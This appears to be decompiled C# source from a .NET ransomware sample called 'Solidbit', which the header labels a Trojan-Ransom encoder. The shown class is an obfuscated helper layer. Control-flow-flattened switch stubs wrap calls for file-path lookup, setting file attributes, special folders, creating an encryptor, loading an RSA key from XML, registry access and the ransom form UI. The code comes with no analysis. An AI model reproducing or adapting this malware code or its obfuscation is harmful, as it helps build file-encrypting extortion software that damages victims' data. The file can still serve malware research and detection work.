// Decompiled with JetBrains decompiler
// Type: Ⴍ.Ⴀ
// Assembly: Solidbit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 26DE91FF-6227-4563-A7FE-F47F2E4BF04A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.06\HEUR-Trojan-Ransom.MSIL.Encoder.gen-63c9e7ec3a191e9ffbfc388a3cf7375693b609f4fd223b3fbcc9d7d21759b1bc.exe

using KamelAmenThaabet;
using Microsoft.Win32;
using System;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace Ⴍ
{
  internal static class Ⴀ
  {
    [SecuritySafeCritical]
    [STAThread]
    private static void Ⴅ()
    {
      Ⴍ.Ⴍ.Ⴐ.ႨႥ();
      int num = 2;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
            goto label_3;
          default:
            Ⴍ.Ⴀ.Ⴈ(666, 661);
            Ⴍ.Ⴍ.Ⴐ.Ⴀ(false, 101, 29);
            num = 1;
            continue;
        }
      }
label_3:
      Application.Run((Form) new Form1());
    }

    [SecuritySafeCritical]
    internal static System.Type Ⴓ([In] RuntimeTypeHandle obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 77:
          num1 = 6;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 2:
            num2 = 5;
            continue;
          case 3:
            num2 = 5;
            continue;
          case 4:
          case 5:
            goto label_3;
          case 6:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴍ.Ⴀ.Ⴓ);
            num2 = 5;
            continue;
        }
      }
label_8:
      return System.Type.GetTypeFromHandle(obj0);
    }

    [SecuritySafeCritical]
    internal static object Ⴃ(
      [In] ResourceManager obj0,
      [In] string obj1,
      [In] CultureInfo obj2,
      [In] int obj3,
      [In] int obj4)
    {
label_3:
      int num1;
      switch (obj4 ^ obj3)
      {
        case 23:
          num1 = 0;
          break;
        default:
          num1 = 1;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_8;
          case 1:
          case 7:
            num2 = 3;
            continue;
          case 2:
            num2 = 3;
            continue;
          case 3:
          case 4:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴍ.Ⴀ.Ⴃ);
            num2 = 3;
            continue;
        }
      }
label_8:
      return obj0.GetObject(obj1, obj2);
    }

    [SecuritySafeCritical]
    internal static string Ⴗ([In] string obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 101:
          num1 = 5;
          break;
        case 102:
          num1 = 0;
          break;
        case 103:
          num1 = 10;
          break;
        case 104:
          num1 = 9;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_12;
          case 2:
          case 5:
            goto label_11;
          case 3:
          case 7:
            num2 = 6;
            continue;
          case 4:
          case 9:
            goto label_14;
          case 6:
            goto label_3;
          case 8:
            num2 = 6;
            continue;
          case 10:
            goto label_13;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴍ.Ⴀ.Ⴗ);
            num2 = 6;
            continue;
        }
      }
label_11:
      return obj0.ToLower();
label_12:
      return Path.GetExtension(obj0);
label_13:
      return Path.GetFileName(obj0);
label_14:
      return Path.GetPathRoot(obj0);
    }

    [SecuritySafeCritical]
    internal static void Ⴄ([In] FileSystemInfo obj0, [In] FileAttributes obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 4;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 2:
            goto label_7;
          case 1:
            num1 = 4;
            continue;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 120:
                num2 = 2;
                break;
              default:
                num2 = 1;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.Attributes = obj1;
    }

    [SecuritySafeCritical]
    internal static string Ⴍ([In] Environment.SpecialFolder obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 28:
          num1 = 0;
          break;
        default:
          num1 = 5;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_8;
          case 1:
          case 3:
            num2 = 7;
            continue;
          case 4:
          case 5:
            num2 = 7;
            continue;
          case 6:
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴍ.Ⴀ.Ⴍ);
            num2 = 7;
            continue;
        }
      }
label_8:
      return Environment.GetFolderPath(obj0);
    }

    [SecuritySafeCritical]
    internal static void Ⴈ([In] int obj0, [In] int obj1)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 2:
            goto label_7;
          case 3:
          case 5:
            num1 = 1;
            continue;
          default:
            int num2;
            switch (obj1 ^ obj0)
            {
              case 15:
                num2 = 0;
                break;
              default:
                num2 = 5;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      Application.EnableVisualStyles();
    }

    [SecuritySafeCritical]
    internal static int Ⴀ([In] Random obj0, [In] int obj1, [In] int obj2, [In] int obj3, [In] int obj4)
    {
label_3:
      int num1;
      switch (obj4 ^ obj3)
      {
        case 80:
          num1 = 2;
          break;
        default:
          num1 = 1;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 6;
            continue;
          case 1:
            num2 = 6;
            continue;
          case 2:
          case 3:
            goto label_8;
          case 4:
          case 5:
          case 6:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴍ.Ⴀ.Ⴀ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return obj0.Next(obj1, obj2);
    }

    [SecuritySafeCritical]
    internal static int Ⴐ([In] Random obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 75:
          num1 = 0;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
          case 3:
            goto label_8;
          case 2:
            num2 = 7;
            continue;
          case 5:
            num2 = 7;
            continue;
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴍ.Ⴀ.Ⴐ);
            num2 = 7;
            continue;
        }
      }
label_8:
      return obj0.Next(obj1);
    }

    [SecuritySafeCritical]
    internal static ICryptoTransform Ⴜ([In] SymmetricAlgorithm obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 101:
          num1 = 7;
          break;
        default:
          num1 = 6;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 2:
            goto label_3;
          case 3:
          case 5:
          case 7:
            goto label_8;
          case 4:
            num2 = 2;
            continue;
          case 6:
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴍ.Ⴀ.Ⴜ);
            num2 = 2;
            continue;
        }
      }
label_8:
      return obj0.CreateEncryptor();
    }

    [SecuritySafeCritical]
    internal static void ႣႳ([In] AsymmetricAlgorithm obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 4:
            goto label_7;
          case 1:
          case 5:
            num1 = 2;
            continue;
          case 3:
            goto label_8;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 63:
                num2 = 0;
                break;
              default:
                num2 = 1;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.FromXmlString(obj1);
    }

    [SecuritySafeCritical]
    internal static string ႣႣ([In] FileSystemInfo obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 25:
          num1 = 2;
          break;
        default:
          num1 = 4;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
            num2 = 3;
            continue;
          case 2:
            goto label_8;
          case 3:
          case 5:
            goto label_3;
          case 7:
            num2 = 3;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴍ.Ⴀ.ႣႣ);
            num2 = 3;
            continue;
        }
      }
label_8:
      return obj0.Name;
    }

    [SecuritySafeCritical]
    internal static string ႣႷ([In] string obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 58:
          num1 = 0;
          break;
        default:
          num1 = 6;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
            goto label_8;
          case 1:
            goto label_3;
          case 3:
          case 5:
            num2 = 1;
            continue;
          case 6:
          case 7:
            num2 = 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴍ.Ⴀ.ႣႷ);
            num2 = 1;
            continue;
        }
      }
label_8:
      return obj0 + obj1;
    }

    [SecuritySafeCritical]
    internal static RegistryKey ႣႥ(
      [In] RegistryKey obj0,
      [In] string obj1,
      [In] bool obj2,
      [In] int obj3,
      [In] int obj4)
    {
label_3:
      int num1;
      switch (obj4 ^ obj3)
      {
        case 96:
          num1 = 3;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 4;
            continue;
          case 1:
          case 2:
          case 5:
          case 6:
            num2 = 4;
            continue;
          case 3:
            goto label_8;
          case 4:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴍ.Ⴀ.ႣႥ);
            num2 = 4;
            continue;
        }
      }
label_8:
      return obj0.OpenSubKey(obj1, obj2);
    }

    [SecuritySafeCritical]
    internal static System.Drawing.Color ႣႤ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 5:
          num1 = 8;
          break;
        case 6:
          num1 = 7;
          break;
        case 7:
          num1 = 0;
          break;
        case 8:
          num1 = 5;
          break;
        case 9:
          num1 = 11;
          break;
        case 10:
          num1 = 6;
          break;
        default:
          num1 = 9;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
            goto label_15;
          case 2:
            num2 = 10;
            continue;
          case 4:
          case 8:
            goto label_13;
          case 5:
            goto label_16;
          case 6:
            goto label_18;
          case 7:
            goto label_14;
          case 9:
          case 12:
            num2 = 10;
            continue;
          case 10:
            goto label_3;
          case 11:
            goto label_17;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴍ.Ⴀ.ႣႤ);
            num2 = 10;
            continue;
        }
      }
label_13:
      return System.Drawing.Color.WhiteSmoke;
label_14:
      return SystemColors.ActiveCaptionText;
label_15:
      return System.Drawing.Color.White;
label_16:
      return System.Drawing.Color.Black;
label_17:
      return System.Drawing.Color.Green;
label_18:
      return System.Drawing.Color.Navy;
    }

    [SecuritySafeCritical]
    internal static Control.ControlCollection ႣႭ([In] Control obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 92:
          num1 = 3;
          break;
        default:
          num1 = 6;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
            num2 = 7;
            continue;
          case 2:
          case 3:
            goto label_8;
          case 5:
          case 6:
            num2 = 7;
            continue;
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴍ.Ⴀ.ႣႭ);
            num2 = 7;
            continue;
        }
      }
label_8:
      return obj0.Controls;
    }

    [SecuritySafeCritical]
    internal static void ႣႨ([In] Control obj0, [In] bool obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_8;
          case 1:
            goto label_7;
          case 3:
          case 5:
            num1 = 2;
            continue;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 111:
                num2 = 1;
                break;
              default:
                num2 = 5;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.AutoSize = obj1;
    }

    [SecuritySafeCritical]
    internal static string ႣႠ([In] string obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_0:
      switch ((obj3 ^ obj2) - 73)
      {
        case 0:
          return obj0 + obj1;
        default:
          goto label_0;
      }
    }

    [SecuritySafeCritical]
    internal static object ႣႰ([In] AppDomain obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_0:
      switch ((obj3 ^ obj2) - 105)
      {
        case 0:
          return obj0.GetData(obj1);
        default:
          goto label_0;
      }
    }
  }
}
